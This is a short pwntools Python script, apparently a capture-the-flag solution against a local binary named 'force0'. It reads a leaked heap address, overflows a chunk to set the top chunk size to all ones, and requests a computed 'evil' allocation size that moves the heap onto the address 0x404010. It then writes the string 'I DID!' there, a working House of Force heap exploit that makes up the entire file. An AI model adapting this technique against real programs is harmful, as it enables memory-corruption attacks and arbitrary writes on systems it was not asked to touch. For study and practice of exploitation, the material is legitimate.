# coding: utf-8
from pwn import *
context.log_level = 'error' # don't know what it does but i copied from someone's writeup
context.arch = 'amd64' 
def fun():
    p=process("./force0",env={'LD_LIBRARY_PATH':'.'})
    print(p.recvuntil("@"))
    heap = p.recvuntil("0\n")
    print(heap)
    #heap = heap[13:23]
    heap2 = int(heap,16)
    print(heap2,int(heap[:-1],16))
    p.sendline("1")
    p.sendline("100")
    p.sendline(b"a"*100+p64(0xffffffffffffffff))#b"\xff\xff\xff\xff")
    print(p.recv())
    p.sendline("1")
    target = 0x404010
    evil = target - heap2 - 136 # heap2-target -16-32
    p.sendline(f"{evil}")
    p.sendline("hello")
    print(p.recv())
    p.sendline("1")
    p.sendline("7")
    print(p.recv())
    p.sendline(b"I DID!\x00")
    print(p.recvall())
    p.sendline("2")
    resp = p.recv()
    print(resp)
    p.close()
    
    
fun()
